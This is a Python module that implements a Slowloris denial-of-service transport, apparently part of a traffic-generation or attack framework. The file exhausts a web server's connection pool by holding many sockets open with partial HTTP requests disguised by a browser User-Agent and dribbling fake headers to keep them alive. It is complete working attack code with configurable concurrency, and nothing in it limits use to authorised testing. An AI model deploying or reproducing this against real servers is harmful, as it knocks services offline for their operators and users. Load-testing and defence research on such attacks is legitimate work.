"""Slowloris transport - holds HTTP connections open with partial headers.

Slowloris is a low-bandwidth DoS attack that exhausts a web server's connection
pool by opening many connections and sending partial HTTP headers very slowly.
"""

from __future__ import annotations

import socket
import time
from typing import ClassVar

from ..models import ProfileName, Target, TransportKind
from .base import Transport, TransportError, build_payload

__all__ = ["SlowlorisTransport"]


class SlowlorisTransport(Transport):
    """Slowloris attack transport - holds HTTP connections with partial headers."""

    kind: ClassVar[TransportKind] = TransportKind.SOCKET

    def __init__(
        self,
        target: Target,
        profile: ProfileName,
        *,
        header_interval: float = 10.0,
    ) -> None:
        super().__init__(target, profile)
        if profile != ProfileName.SLOWLORIS:
            raise TransportError("SlowlorisTransport only supports SLOWLORIS profile")
        self.header_interval = header_interval
        self._sockets: list[socket.socket] = []

    def close(self) -> None:
        # Base close() sets the stop event and marks the transport closed.
        super().close()
        for sock in self._sockets:
            try:
                sock.close()
            except Exception:
                pass
        self._sockets.clear()

    def send_one(self, payload: bytes) -> None:
        """Not used for Slowloris - uses worker loop instead."""
        self._count_attempt()
        self._count_error()
        raise TransportError("Slowloris uses worker loop, not send_one")

    def worker_loop(self, worker_id: int, per_worker_pps: float) -> None:
        """Hold HTTP connections open, dribbling headers at them.

        Concurrency is derived from the rate: ten partial requests per second
        is the point of the attack, so one held connection is treated as ten
        packets per second of budget.

        Every wait goes through ``self._stop.wait`` rather than
        ``time.sleep``. A bare sleep is uninterruptible, so the loop would sit
        out the full header interval *after* the run's deadline had passed; the
        engine's join grace is shorter than that interval, so the worker never
        reported a result and the whole run looked like it had sent nothing.
        """
        target_host = self.target.host
        target_port = self.target.port

        # Per-worker budget, so N workers hold N times this many connections.
        concurrent_connections = max(1, int(per_worker_pps) // 10)

        while not self._stop.is_set():
            # Maintain target number of connections
            while len(self._sockets) < concurrent_connections and not self._stop.is_set():
                sock = None
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5.0)
                    sock.connect((target_host, target_port))
                    self._sockets.append(sock)

                    # Send initial partial request
                    request = (
                        f"GET /?{hash((worker_id, time.time()))} HTTP/1.1\r\n"
                        f"Host: {target_host}\r\n"
                        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"X-Custom-"
                    ).encode("ascii")

                    sock.send(request)
                    self._count_sent(len(request))

                except (socket.timeout, ConnectionRefusedError, ConnectionResetError, BrokenPipeError, OSError) as exc:
                    self._count_error()
                    if sock:
                        try:
                            sock.close()
                        except Exception:
                            pass
                    # Interruptible backoff. A dead target must not turn this
                    # into a spin loop, but a stop must not have to wait for it.
                    if self._stop.wait(1.0):
                        break

            if not self._sockets or self._stop.is_set():
                continue

            # Keep connections alive by sending headers periodically
            if self._stop.wait(self.header_interval):
                break

            header_num = 0
            for sock in self._sockets[:]:
                if self._stop.is_set():
                    break
                try:
                    header = f"X-Custom-{header_num}: {hash((worker_id, time.time()))}\r\n".encode("ascii")
                    sock.send(header)
                    self._count_sent(len(header))
                except (ConnectionResetError, BrokenPipeError, OSError):
                    self._count_error()
                    try:
                        sock.close()
                    except Exception:
                        pass
                    if sock in self._sockets:
                        self._sockets.remove(sock)
            header_num += 1
    def describe(self) -> dict[str, object]:
        info = super().describe()
        info["header_interval"] = self.header_interval
        info["active_connections"] = len(self._sockets)
        return info